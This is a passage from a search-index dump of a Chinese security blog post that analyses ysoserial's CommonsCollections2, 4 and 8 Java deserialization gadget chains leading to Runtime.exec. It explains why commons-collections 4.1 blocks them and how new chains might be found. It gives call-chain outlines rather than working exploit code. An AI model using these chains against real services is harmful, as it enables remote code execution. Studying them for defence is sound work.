\u8c03\u7528 \uff0c \u7531\u4e8e \u524d\u9762 \u5206\u6790 \u8fc7 \u8fd9\u4e2a \u5229\u7528 \u65b9\u5f0f \uff0c \u540e\u6587 \u4e0d\u518d \u590d\u8ff0 \u3002   0x02   \u5229\u7528 \u5206\u6790 \u94fe\u5206\u6790   1 .   CommonsCollections2 , 4   CommonsCollections2 , 4 \u90fd \u7528\u5230 \u4e86 \u4e00\u4e2a \u65b0 \u7684 \u7c7b   PriorityQueue   \u7684   Comparator   \u6765 \u89e6\u53d1   transform   \u51fd\u6570 \uff0c \u4e24\u8005 \u7684 \u533a\u522b \u5728\u4e8e \u4e2d\u95f4 \u7684 \u6865\u63a5 \u7528 \u7684 \u4e0d\u540c \u7684 Transformer \u5bf9\u8c61 \u3002 \u5148 \u6765\u770b \u4e00\u4e0b   PriorityQueue . readObject   \u6846\u6846 \u91cc \u7684 \u4e3b\u8981 \u5de5\u4f5c \u4e3a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6062\u590d \u8be5 \u5bf9\u8c61 \u7684 \u6570\u636e \uff0c \u6211\u4eec \u91cd\u70b9 \u5173\u6ce8   heapify ( )   \u7ee7\u7eed \u8ddf\u8fdb   siftDown   \u5f53 \u6211\u4eec \u5728 \u5b9e\u4f8b \u5316 \u5bf9\u8c61 \u65f6 \u63d0\u4f9b \u4e86   comparator   \uff0c \u5c06\u4f1a \u6765\u5230 \u6211\u4eec \u6700\u7ec8 \u89e6\u53d1 compare \u7684 \u4f4d\u7f6e \uff0c \u770b \u4e00\u4e0b   siftDownUsingComparator   \u8fd9\u91cc \u8c03\u7528 \u4e86 \u6211\u4eec \u4f20\u5165 \u7684 comparator \uff0c \u5e76 \u8c03\u7528 \u5176 compare \uff0c \u5229\u7528 \u94fe\u4e2d \u4f7f\u7528 \u4e86   TransformingComparator   , \u6765\u770b \u4e00\u4e0b \u5b83 \u7684 compare \u51fd\u6570   \u8c03\u7528 \u4e86 \u5f53\u524d \u7684 transformer \u7684 transform \u51fd\u6570 \uff0c \u770b\u5230 \u8fd9\u91cc \uff0c \u5176\u5b9e \u5df2\u7ecf \u5f88\u719f \u4e86 \uff0c \u524d\u9762 \u5206\u6790 \u7684 \u5f88\u591a \u5229\u7528 \u94fe \u90fd \u8ddf transform \u6709\u5173 \uff0c \u5e76\u4e14 4.0 \u7248\u672c \u5e76 \u6ca1\u6709 \u62c9\u9ed1 \u76f8\u5173 \u7684 transformer \u3002 \u6240\u4ee5 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u6211\u4eec \u5c31 \u53ef\u4ee5 \u7528 \u524d\u9762 \u7684 \u4e00\u4e9b \u601d\u8def \u4e86 \u3002   CommonsCollections2   CommonsCollections2 \u5229\u7528 \u4e86 InvokerTransformer \u7c7b \u7684 \u4efb\u610f \u7c7b \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u7684 transform \uff0c \u4f20\u5165 \u6784\u9020 \u597d \u7684 templates   gadget \u5e76 \u8c03\u7528   TemplatesImpl . newTransformer   CommonsCollections4   CommonsCollections4 \u540e\u7eed \u7528 \u7684 \u65b9\u6cd5 \u540c CommonsCollections3 \u4e00\u6837 \uff0c \u7528   InstantiateTransformer   \u6765 \u89e6\u53d1   TrAXFilter   \u7684 \u521d\u59cb \u521d\u59cb\u5316 \uff0c \u6700\u7ec8 \u4e5f \u5c06 \u8c03\u7528   TemplatesImpl . newTransformer   \u6574\u7406 \u4e00\u4e0b \u5229\u7528 \u94fe   CommonsCollection2 :   PriorityQueue . readObject   - >   PriorityQueue . heapify ( )   - >   PriorityQueue . siftDown ( )   - >   PriorityQueue . siftDownUsingComparator ( )   - >   TransformingComparator . compare ( )   - >   InvokerTransformer . transform ( )   - >   TemplatesImpl . newTransformer ( )   ...   templates   Gadgets   ...   - >   Runtime . getRuntime ( ) . exec ( )   CommonsCollection4 :   PriorityQueue . readObject   - >   PriorityQueue . heapify ( )   - >   PriorityQueue . siftDown ( )   - >   PriorityQueue . siftDownUsingComparator ( )   - >   TransformingComparator . compare ( )   - >   ChainedTransformer . transform ( )   - >   InstantiateTransformer . transform ( )   - >   TemplatesImpl . newTransformer ( )   ...   templates   Gadgets   ...   - >   Runtime . getRuntime ( ) . exec ( )   2 . CommonsCollections8   CommonsCollections8 \u662f \u4eca\u5e74   navalorenzo   \u63a8\u9001 \u5230 ysoserial \u4e0a \u7684 \uff0c 8 \u4e0e 2 \uff0c 4 \u7684 \u533a\u522b \u5728\u4e8e \u4f7f\u7528 \u4e86 \u65b0 \u7684 readObject \u89e6\u53d1 \u70b9   TreeBag   \u6765\u770b \u4e00\u4e0b   TreeBag . readObject   \u8fd9\u91cc \u7684 \u4e24\u4e2a \u5173\u952e \u5173\u952e\u70b9   TreeBag   \u7684 \u7236\u7c7b \u7684   doReadObject   \u51fd\u6570 \u548c   TreeMap   .   \u770b \u4e00\u4e0b   doReadObject   \u8fd9\u91cc \u5bf9 \u4f20\u5165 \u7684 TreeMap \u8c03\u7528 \u4e86   put   \u51fd\u6570   \u7ee7\u7eed \u8ddf\u8fdb   compare   \u51fd\u6570   \u8fd9\u91cc \u53c8 \u56de\u5230 \u4e86 \u719f\u6089 \u7684   comparator . compare   \u51fd\u6570 \uff0c \u5176\u4e2d   comparator   \u5c31\u662f \u6211\u4eec \u6784\u9020 \u7684   TransformingComparator   \u540e\u7eed \u8ddf CommonsCollections2 \u76f8\u540c \uff0c \u5c31 \u4e0d \u590d\u8ff0 \u4e86 \u3002   \u6574\u7406 \u4e00\u4e0b \u5229\u7528 \u94fe   TreeBag . readObject ( )   - >   AbstractMapBag . doReadObject ( )   - >   TreeMap . put ( )   - >   TransformingComparator . compare ( )   - >   InvokerTransformer . transform ( )   - >   TemplatesImpl . newTransformer ( )   ...   templates   Gadgets   ...   - >   Runtime . getRuntime ( ) . exec ( )   3 .   commons - collections : 4.1 \u53ca \u4ee5\u4e0a \u7684 \u6539\u53d8   \u524d\u9762 \u63d0\u5230 \u7684 CommonsCollections2 , 4 , 8 \uff0c \u90fd \u662f \u5728 commons - collections : 4.0 \u7248\u672c \u4e0b\u624d \u53ef\u4ee5 \u4f7f\u7528 \u7684 \u3002 \u8fd9\u91cc \u6211\u4eec \u6765 \u770b\u770b \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u5728 4.1 \u53ca \u4ee5\u4e0a \u7248\u672c \u65e0\u6cd5 \u5229\u7528 \uff01   \u524d\u9762 \u6211\u4eec \u7528\u5230 \u4e86 InvokerTransformer \u548c InstantiateTransformer \u4f5c\u4e3a \u4e2d\u8f6c \uff0c \u5f88 \u771f\u5b9e \uff0c 4.1 \u7248\u672c \u8fd9 \u4e24\u4e2a \u7c7b \u90fd \u6ca1\u6709 \u5b9e\u73b0 Serializable \u63a5\u53e3 \uff0c \u5bfc\u81f4 \u6211\u4eec \u5728 \u5e8f\u5217 \u5e8f\u5217\u5316 \u65f6 \u5c31 \u65e0\u6cd5 \u5229\u7528 \u8fd9 \u4e24\u4e2a \u7c7b \u3002 emmmmm \uff0c \u76f4\u63a5 \u5e72\u6389 \u4e86 \u4e0a\u9762 \u7684 2 \uff0c 4 \uff0c 8 \u3002   \u8fd9\u4e2a \u6539\u53d8 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u9700\u8981 \u4ece \u5176\u4ed6 \u53ef \u64cd\u4f5c \u5371\u9669 \u65b9\u6cd5 \u7684 \u5bf9\u8c61 \u4e86 \u3002   0x03   \u603b\u7ed3   \u5206\u6790 \u5b8c ysoserial \u91cc \u7684 commons - collections \u7cfb\u5217 \u7684 payloads \uff0c \u6211\u4eec \u53ef\u4ee5 \u7b80\u5355 \u603b\u7ed3 \u4e00\u4e0b Java \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6316\u6398 \u601d\u8def \uff08 \u4e0d \u6d89\u53ca \u6280\u672f \u70b9 \uff0c \u4e2a\u4eba \u7684 \u4e00\u4e9b \u60f3\u6cd5 \uff09 \u3002   1 .   \u6700\u7ec8 \u7684 \u5229\u7528 \u6548\u679c   \u5728 \u5229\u7528 \u94fe \u6784\u9020 \u4e2d \uff0c \u6211\u4eec \u80af\u5b9a \u5e0c\u671b \u6700\u7ec8 \u53ef\u4ee5 \u8fbe\u5230 \u4efb\u610f \u547d\u4ee4 \u6267\u884c \u6216\u8005 \u662f \u4efb\u610f \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u7684 \u6548\u679c \uff0c \u8fd9\u6837 \u4f1a \u4f7f\u5f97 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 \u5a01\u529b \u6700\u5927 \u5927\u5316 \u6700\u5927\u5316 \u3002 \u6240\u4ee5 \u6211\u4eec \u5f88 \u5f00\u5fc3 \u80fd \u770b\u5230 InvokerTransformer \u7684 transform \u51fd\u6570 \uff0c \u4ed6 \u5229\u7528 \u53cd\u5c04 \u673a\u5236 \u6765 \u8c03\u7528 \u4efb\u610f \u7684 \u4ee3\u7801 \uff0c \u4e5f \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u80fd \u63a7\u5236 \u4efb\u610f \u7c7b \u7684 \u8c03\u7528 \u6267\u884c \u3002 \u4f46\u662f \u5728 \u5b9e\u9645 \u7684 \u6316\u6398 \u4e2d \uff0c \u9664\u4e86 \u5bf9 \u53cd\u5c04 \u673a\u5236 \u7684 \u6316\u6398 \u548c defineClass \u7c7b\u578b \u7684 \u6316\u6398 \uff0c \u6211\u4eec \u4e5f \u5e94\u8be5 \u6ce8\u610f \u5230 \u5176\u4ed6 \u53ef\u80fd \u4f1a \u5b58\u5728 \u7684 \u5371\u9669 \u5229\u7528 \uff0c \u5982 \u4efb\u610f \u6587\u4ef6 \u5199\u5165 \uff0c \u4efb\u610f \u6587\u4ef6 \u5220\u9664 \u7b49\u7b49 \u3002   2 .   \u5229\u7528 \u94fe \u603b\u4f53 \u7684 \u4e00\u4e2a \u6316\u6398 \u601d\u8def   \u6211\u4eec \u5728 \u5206\u6790 \u5b8c \u6240\u6709 \u7684 CommonsCollections \u7684 payloads \u5f88 \u5bb9\u6613 \u53d1\u73b0 \u7684 \u4e00\u70b9 \u662f \u5f88\u591a payloads \u201c \u6742\u4ea4 \u201d \u7ec4\u5408 \u4e86 \u591a\u4e2a \u53ef \u5229\u7528 \u7684 \u8282\u70b9 \u3002 \u90a3\u4e48 \u6211\u4eec \u5728 \u5b9e\u9645 \u7684 \u6316\u6398 \u4e2d \uff0c \u6211\u4eec \u9700\u8981 \u9996\u5148 \u80fd \u83b7\u77e5 \u54ea\u4e9b \u5e93 \u6587\u4ef6 \u91cc \u6709 \u54ea\u4e9b \u53ef \u5229\u7528 \u7684 \u8282\u70b9 \uff0c \u7136\u540e \u6839\u636e \u4e00\u5b9a \u7684 \u89c4\u5219 \u6765 \u8fdb\u884c \u4e00\u4e2a \u94fe\u6761 \u7684 \u8fde\u63a5 \u3002   \u90a3\u4e48 \u6765\u770b \u4e00\u4e0b \uff0c \u53ef \u5229\u7528 \u7684 \u8282\u70b9 \u662f \u4ec0\u4e48 \uff1f   \u5b9e\u73b0 \u4e86   Serializable   \u63a5\u53e3 \uff0c \u679a\u4e3e \u51fa \u6240\u6709 \u53ef\u4ee5 \u88ab \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u7c7b \u3002   \u8be5\u7c7b \u7684 \u7c7b \u5c5e\u6027 \u505a \u4e86 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u6216 \u51fd\u6570 \u7684 \u8fd4\u56de \u8fd4\u56de\u503c \uff0c \u5982   TreeMap . map . put ( )   \u548c   ConstantTransformer . transform   \u76f4\u63a5 \u8fd4\u56de   iConstant   \u7c7b \u5c5e\u6027 \u3002 \u5982\u679c \u4e0d \u5b58\u5728 \u4e0a\u8ff0 \u7684 \u60c5\u51b5 \uff0c \u6211\u4eec \u53ef\u4ee5 \u5ffd\u7565 \u3002   \u5b9e\u73b0 \u4e86   readObject   \u51fd\u6570 \uff0c \u8fd9\u79cd \u60c5\u51b5 \u53ef \u4f5c\u4e3a \u8d77\u59cb \u70b9 \uff0c \u4e5f \u53ef\u4ee5 \u4f5c\u4e3a \u6865 \u63a5\u70b9 \uff0c \u9700\u8981 \u5177\u4f53 \u5224\u65ad \u5176 \u4ee3\u7801 \u7684 \u5b9e\u73b0 \u3002   \u5b9e\u73b0 \u4e86   invoke   \u51fd\u6570 \uff0c \u8fd9\u79cd \u60c5\u51b5 \u53ef \u4f5c\u4e3a \u6865 \u63a5\u70b9 \uff0c \u5229\u7528 \u4e86 \u4ee3\u7406 \u673a\u5236 \u3002   \u4ece   readObject   \u51fd\u6570 \u548c   invoke   \u51fd\u6570 \uff0c \u884d\u751f \u51fa\u6765 \u7684 \u7c7b \u5c5e\u6027 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \uff0c \u8fd9\u8fb9 \u53ef\u80fd \u4f1a \u5f15\u5411 \u5176\u4ed6 \u7684 \u7c7b \u51fd\u6570 \uff0c \u5982   TreeBag . readObject   \u7684 \u5b9e\u73b0 \uff0c \u5c06 \u5f15\u5411 \u4e0b \u4e00\u6b65 \u7684 \u7236\u7c7b \u51fd\u6570   doReadObject   \u51fd\u6570 \u3002 \u8fd9\u91cc \u5c31 \u9700\u8981 \u505a \u4e00\u4e2a \u4eba\u5de5 \u6216\u8005 \u662f \u9759\u6001 \u7684 \u4ee3\u7801 \u5206\u6790 \u3002   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u5173\u4e8e \u53ef \u5229\u7528 \u8282\u70b9 \u7684 \u4e32\u8054 \uff0c \u5176\u5b9e \u4e3b\u8981 \u4f9d\u8d56 \u8d56\u4e8e \u4f9d\u8d56\u4e8e \u7b2c 5 \u70b9 \u7684 \u6316\u6398 \uff0c \u6211\u4eec \u9700\u8981 \u6839\u636e \u7ecf\u9a8c \u6216\u8005 \u662f \u9759\u6001 \u7684 \u4ee3\u7801 \u5206\u6790 \u6765 \u505a \u3002   \u6839\u636e \u4e0a\u9762 \u7684 \u4e00\u4e2a \u5206\u6790 \uff0c \u5176\u5b9e \u6211\u4eec \u53ef\u4ee5 \u505a\u5230 \u4e00\u4e2a \u81ea\u52a8 \u81ea\u52a8\u5316 \u7684 \u5229\u7528 \u94fe \u53d1\u6398 \uff0c https : / / github . com / JackOfMostTrades / gadgetinspector   \u8fd9\u4e2a \u5de5\u5177 \u5c31\u662f \u4e00\u4e2a \u5f88 \u597d \u7684 \u5b9e\u73b0 \uff0c \u540e\u7eed \u5c06 \u5bf9 \u5176 \u8fdb\u884c \u4e00\u4e2a \u5206\u6790 \u3002   \u4ece commons - collections \u7684 \u9632\u62a4 \u6765\u770b \uff0c \u6211\u4eec \u8d8a\u6765 \u8d8a\u6765\u8d8a \u65e0\u6cd5 \u5728 \u5355\u4e2a \u5e93 \u91cc\u9762 \u5b9e\u73b0 \u4e00\u4e2a \u53ef \u5229\u7528 \u7684 \u5229\u7528 \u94fe \uff0c \u8fd9 \u4e5f \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u9700\u8981 \u5bf9 \u4e0d\u540c \u7684 \u9879\u76ee \u505a \u9488\u5bf9 \u9488\u5bf9\u6027 \u7684 \u5206\u6790 \uff0c \u6240\u4ee5 gadetinspector \u8fd9\u4e2a \u5de5\u5177 \u7684 \u91cd\u8981 \u91cd\u8981\u6027 \u5c31 \u4e0d\u8a00 \u4e0d\u8a00\u800c\u55bb \u4e86 \u3002 \u4e0b \u4e00\u6b65 \u5c06 \u91cd\u70b9 \u5206\u6790 \u4e00\u4e0b \u8be5 \u5de5\u5177 \u7684 \u5b9e\u73b0 \u3002","title":"Java \u53cd \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections2 , 4 , 8"},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#0x00","text":"\u524d\u9762 \u51e0\u7bc7 \u6587\u7ae0 \uff0c \u5206\u6790 \u4e86 CommonsCollections : 3.2 . 1 \u7248\u672c \u4ee5\u4e0b \u5b58\u5728 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u94fe \u3002 \u4eca\u5929 \u5c06 \u7ee7\u7eed \u5206\u6790 CommonsCollections : 4.0 \u7248\u672c \uff0c \u4e3b\u8981 \u8bb2\u8ff0 CommonsCollections2 \uff0c 4 \uff0c 8 \u7684 \u5229\u7528 \u94fe \u6784\u9020 \u3002","title":"0x00   \u524d\u8a00"},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#0x01","text":"commons - collections : 4.0 \u7248\u672c \u5176\u5b9e \u5e76 \u6ca1\u6709 \u50cf 3.2 . 2 \u7248\u672c \u7684 \u4fee\u590d \u65b9\u5f0f \u4e00\u6837 \u505a\u62c9\u9ed1 \u5904\u7406 \uff0c \u6240\u4ee5 \u5728 3.2 . 1 \u53ca \u4ee5\u4e0b \u7684 \u5229\u7528 \u94fe \u6539\u6539 \u8fd8\u662f \u53ef\u4ee5 \u7528 \u7684 \u3002   \u4f8b\u5982 CommonsCollections5   final   Map   <   String   ,   String   >   innerMap   =   new   HashMap   ( ) ;   final   Map   lazyMap   =   LazyMap   .   lazyMap   (   innerMap   ,   transformerChain   ) ;   \u5c06 innerMap \u6539\u6210 \u952e\u503c \u5bf9 \u7684 \u7533\u660e \u65b9\u5f0f \u5373\u53ef \uff0c \u4f46\u662f \u5927\u5bb6 \u4e0d\u662f \u662f\u4e0d\u662f \u8fd8 \u8bb0\u5f97 \uff0c \u9664\u4e86 \u7528 LazyMap \u7684 \u65b9\u5f0f \uff0c CommonsCollections3 \u66fe \u63d0\u5230 \u8fc7 \u4f7f\u7528   TrAXFilter   \u7c7b \u521d\u59cb \u521d\u59cb\u5316 \u7684 \u65b9\u5f0f \u6765 \u8f7d\u5165 \u4efb\u610f \u7684 class   bytes \u6570\u7ec4 \u3002   commons - collections : 4.0 \u7248\u672c \u4e0b \u7684 \u5229\u7528 \u94fe \uff0c \u7528 \u7684 \u90fd \u662f TemplatesImpl \u4f5c\u4e3a \u6700\u7ec8 \u7684 \u547d\u4ee4 \u6267\u884c \u7684 \u4ee3\u7801 \u8c03\u7528 \uff0c \u7531\u4e8e \u524d\u9762 \u5206\u6790 \u8fc7 \u8fd9\u4e2a \u5229\u7528 \u65b9\u5f0f \uff0c \u540e\u6587 \u4e0d\u518d \u590d\u8ff0 \u3002","title":"0x01   \u524d\u666f \u56de\u987e"},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#0x02","text":"","title":"0x02   \u5229\u7528 \u94fe\u5206\u6790"},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#1-commonscollections24","text":"CommonsCollections2 , 4 \u90fd \u7528\u5230 \u4e86 \u4e00\u4e2a \u65b0 \u7684 \u7c7b   PriorityQueue   \u7684   Comparator   \u6765 \u89e6\u53d1   transform   \u51fd\u6570 \uff0c \u4e24\u8005 \u7684 \u533a\u522b \u5728\u4e8e \u4e2d\u95f4 \u7684 \u6865\u63a5 \u7528 \u7684 \u4e0d\u540c \u7684 Transformer \u5bf9\u8c61 \u3002 \u5148 \u6765\u770b \u4e00\u4e0b   PriorityQueue . readObject   \u6846\u6846 \u91cc \u7684 \u4e3b\u8981 \u5de5\u4f5c \u4e3a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6062\u590d \u8be5 \u5bf9\u8c61 \u7684 \u6570\u636e \uff0c \u6211\u4eec \u91cd\u70b9 \u5173\u6ce8   heapify ( )   \u7ee7\u7eed \u8ddf\u8fdb   siftDown   \u5f53 \u6211\u4eec \u5728 \u5b9e\u4f8b \u5316 \u5bf9\u8c61 \u65f6 \u63d0\u4f9b \u4e86   comparator   \uff0c \u5c06\u4f1a \u6765\u5230 \u6211\u4eec \u6700\u7ec8 \u89e6\u53d1 compare \u7684 \u4f4d\u7f6e \uff0c \u770b \u4e00\u4e0b   siftDownUsingComparator   \u8fd9\u91cc \u8c03\u7528 \u4e86 \u6211\u4eec \u4f20\u5165 \u7684 comparator \uff0c \u5e76 \u8c03\u7528 \u5176 compare \uff0c \u5229\u7528 \u94fe\u4e2d \u4f7f\u7528 \u4e86   TransformingComparator   , \u6765\u770b \u4e00\u4e0b \u5b83 \u7684 compare \u51fd\u6570   \u8c03\u7528 \u4e86 \u5f53\u524d \u7684 transformer \u7684 transform \u51fd\u6570 \uff0c \u770b\u5230 \u8fd9\u91cc \uff0c \u5176\u5b9e \u5df2\u7ecf \u5f88\u719f \u4e86 \uff0c \u524d\u9762 \u5206\u6790 \u7684 \u5f88\u591a \u5229\u7528 \u94fe \u90fd \u8ddf transform \u6709\u5173 \uff0c \u5e76\u4e14 4.0 \u7248\u672c \u5e76 \u6ca1\u6709 \u62c9\u9ed1 \u76f8\u5173 \u7684 transformer \u3002 \u6240\u4ee5 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u6211\u4eec \u5c31 \u53ef\u4ee5 \u7528 \u524d\u9762 \u7684 \u4e00\u4e9b \u601d\u8def \u4e86 \u3002   CommonsCollections2   CommonsCollections2 \u5229\u7528 \u4e86 InvokerTransformer \u7c7b \u7684 \u4efb\u610f \u7c7b \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u7684 transform \uff0c \u4f20\u5165 \u6784\u9020 \u597d \u7684 templates   gadget \u5e76 \u8c03\u7528   TemplatesImpl . newTransformer   CommonsCollections4   CommonsCollections4 \u540e\u7eed \u7528 \u7684 \u65b9\u6cd5 \u540c CommonsCollections3 \u4e00\u6837 \uff0c \u7528   InstantiateTransformer   \u6765 \u89e6\u53d1   TrAXFilter   \u7684 \u521d\u59cb \u521d\u59cb\u5316 \uff0c \u6700\u7ec8 \u4e5f \u5c06 \u8c03\u7528   TemplatesImpl . newTransformer   \u6574\u7406 \u4e00\u4e0b \u5229\u7528 \u94fe   CommonsCollection2 :   PriorityQueue . readObject   - >   PriorityQueue . heapify ( )   - >   PriorityQueue . siftDown ( )   - >   PriorityQueue . siftDownUsingComparator ( )   - >   TransformingComparator . compare ( )   - >   InvokerTransformer . transform ( )   - >   TemplatesImpl . newTransformer ( )   ...   templates   Gadgets   ...   - >   Runtime . getRuntime ( ) . exec ( )   CommonsCollection4 :   PriorityQueue . readObject   - >   PriorityQueue . heapify ( )   - >   PriorityQueue . siftDown ( )   - >   PriorityQueue . siftDownUsingComparator ( )   - >   TransformingComparator . compare ( )   - >   ChainedTransformer . transform ( )   - >   InstantiateTransformer . transform ( )   - >   TemplatesImpl . newTransformer ( )   ...   templates   Gadgets   ...   - >   Runtime . getRuntime ( ) . exec ( )","title":"1 .   CommonsCollections2 , 4"},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#2commonscollections8","text":"CommonsCollections8 \u662f \u4eca\u5e74   navalorenzo   \u63a8\u9001 \u5230 ysoserial \u4e0a \u7684 \uff0c 8 \u4e0e 2 \uff0c 4 \u7684 \u533a\u522b \u5728\u4e8e \u4f7f\u7528 \u4e86 \u65b0 \u7684 readObject \u89e6\u53d1 \u70b9   TreeBag   \u6765\u770b \u4e00\u4e0b   TreeBag . readObject   \u8fd9\u91cc \u7684 \u4e24\u4e2a \u5173\u952e \u5173\u952e\u70b9   TreeBag   \u7684 \u7236\u7c7b \u7684   doReadObject   \u51fd\u6570 \u548c   TreeMap   .   \u770b \u4e00\u4e0b   doReadObject   \u8fd9\u91cc \u5bf9 \u4f20\u5165 \u7684 TreeMap \u8c03\u7528 \u4e86   put   \u51fd\u6570   \u7ee7\u7eed \u8ddf\u8fdb   compare   \u51fd\u6570   \u8fd9\u91cc \u53c8 \u56de\u5230 \u4e86 \u719f\u6089 \u7684   comparator . compare   \u51fd\u6570 \uff0c \u5176\u4e2d   comparator   \u5c31\u662f \u6211\u4eec \u6784\u9020 \u7684   TransformingComparator   \u540e\u7eed \u8ddf CommonsCollections2 \u76f8\u540c \uff0c \u5c31 \u4e0d \u590d\u8ff0 \u4e86 \u3002   \u6574\u7406 \u4e00\u4e0b \u5229\u7528 \u94fe   TreeBag . readObject ( )   - >   AbstractMapBag . doReadObject ( )   - >   TreeMap . put ( )   - >   TransformingComparator . compare ( )   - >   InvokerTransformer . transform ( )   - >   TemplatesImpl . newTransformer ( )   ...   templates   Gadgets   ...   - >   Runtime . getRuntime ( ) . exec ( )","title":"2 . CommonsCollections8"},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#3-commons-collections41","text":"\u524d\u9762 \u63d0\u5230 \u7684 CommonsCollections2 , 4 , 8 \uff0c \u90fd \u662f \u5728 commons - collections : 4.0 \u7248\u672c \u4e0b\u624d \u53ef\u4ee5 \u4f7f\u7528 \u7684 \u3002 \u8fd9\u91cc \u6211\u4eec \u6765 \u770b\u770b \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u5728 4.1 \u53ca \u4ee5\u4e0a \u7248\u672c \u65e0\u6cd5 \u5229\u7528 \uff01   \u524d\u9762 \u6211\u4eec \u7528\u5230 \u4e86 InvokerTransformer \u548c InstantiateTransformer \u4f5c\u4e3a \u4e2d\u8f6c \uff0c \u5f88 \u771f\u5b9e \uff0c 4.1 \u7248\u672c \u8fd9 \u4e24\u4e2a \u7c7b \u90fd \u6ca1\u6709 \u5b9e\u73b0 Serializable \u63a5\u53e3 \uff0c \u5bfc\u81f4 \u6211\u4eec \u5728 \u5e8f\u5217 \u5e8f\u5217\u5316 \u65f6 \u5c31 \u65e0\u6cd5 \u5229\u7528 \u8fd9 \u4e24\u4e2a \u7c7b \u3002 emmmmm \uff0c \u76f4\u63a5 \u5e72\u6389 \u4e86 \u4e0a\u9762 \u7684 2 \uff0c 4 \uff0c 8 \u3002   \u8fd9\u4e2a \u6539\u53d8 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u9700\u8981 \u4ece \u5176\u4ed6 \u53ef \u64cd\u4f5c \u5371\u9669 \u65b9\u6cd5 \u7684 \u5bf9\u8c61 \u4e86 \u3002","title":"3 .   commons - collections : 4.1 \u53ca \u4ee5\u4e0a \u7684 \u6539\u53d8"},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#0x03","text":"\u5206\u6790 \u5b8c ysoserial \u91cc \u7684 commons - collections \u7cfb\u5217 \u7684 payloads \uff0c \u6211\u4eec \u53ef\u4ee5 \u7b80\u5355 \u603b\u7ed3 \u4e00\u4e0b Java \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6316\u6398 \u601d\u8def \uff08 \u4e0d \u6d89\u53ca \u6280\u672f \u70b9 \uff0c \u4e2a\u4eba \u7684 \u4e00\u4e9b \u60f3\u6cd5 \uff09 \u3002","title":"0x03   \u603b\u7ed3"},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#1","text":"\u5728 \u5229\u7528 \u94fe \u6784\u9020 \u4e2d \uff0c \u6211\u4eec \u80af\u5b9a \u5e0c\u671b \u6700\u7ec8 \u53ef\u4ee5 \u8fbe\u5230 \u4efb\u610f \u547d\u4ee4 \u6267\u884c \u6216\u8005 \u662f \u4efb\u610f \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u7684 \u6548\u679c \uff0c \u8fd9\u6837 \u4f1a \u4f7f\u5f97 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 \u5a01\u529b \u6700\u5927 \u5927\u5316 \u6700\u5927\u5316 \u3002 \u6240\u4ee5 \u6211\u4eec \u5f88 \u5f00\u5fc3 \u80fd \u770b\u5230 InvokerTransformer \u7684 transform \u51fd\u6570 \uff0c \u4ed6 \u5229\u7528 \u53cd\u5c04 \u673a\u5236 \u6765 \u8c03\u7528 \u4efb\u610f \u7684 \u4ee3\u7801 \uff0c \u4e5f \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u80fd \u63a7\u5236 \u4efb\u610f \u7c7b \u7684 \u8c03\u7528 \u6267\u884c \u3002 \u4f46\u662f \u5728 \u5b9e\u9645 \u7684 \u6316\u6398 \u4e2d \uff0c \u9664\u4e86 \u5bf9 \u53cd\u5c04 \u673a\u5236 \u7684 \u6316\u6398 \u548c defineClass \u7c7b\u578b \u7684 \u6316\u6398 \uff0c \u6211\u4eec \u4e5f \u5e94\u8be5 \u6ce8\u610f \u5230 \u5176\u4ed6 \u53ef\u80fd \u4f1a \u5b58\u5728 \u7684 \u5371\u9669 \u5229\u7528 \uff0c \u5982 \u4efb\u610f \u6587\u4ef6 \u5199\u5165 \uff0c \u4efb\u610f \u6587\u4ef6 \u5220\u9664 \u7b49\u7b49 \u3002","title":"1 .   \u6700\u7ec8 \u7684 \u5229\u7528 \u6548\u679c"},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#2","text":"\u6211\u4eec \u5728 \u5206\u6790 \u5b8c \u6240\u6709 \u7684 CommonsCollections \u7684 payloads \u5f88 \u5bb9\u6613 \u53d1\u73b0 \u7684 \u4e00\u70b9 \u662f \u5f88\u591a payloads \u201c \u6742\u4ea4 \u201d \u7ec4\u5408 \u4e86 \u591a\u4e2a \u53ef \u5229\u7528 \u7684 \u8282\u70b9 \u3002 \u90a3\u4e48 \u6211\u4eec \u5728 \u5b9e\u9645 \u7684 \u6316\u6398 \u4e2d \uff0c \u6211\u4eec \u9700\u8981 \u9996\u5148 \u80fd \u83b7\u77e5 \u54ea\u4e9b \u5e93 \u6587\u4ef6 \u91cc \u6709 \u54ea\u4e9b \u53ef \u5229\u7528 \u7684 \u8282\u70b9 \uff0c \u7136\u540e 